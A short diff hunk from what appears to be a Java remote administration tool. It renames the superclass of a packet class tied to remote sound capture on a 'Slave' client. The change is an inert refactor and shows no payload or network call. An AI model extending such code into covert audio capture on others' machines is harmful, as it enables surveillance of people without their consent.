@@ -9,7 +9,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameRemoteSoundCapture;
 
 
-public class PacketSO extends Packet {
+public class PacketSO extends AbstractPacket {
 	
 	private AudioFormat format;
 	private DataLine.Info info;
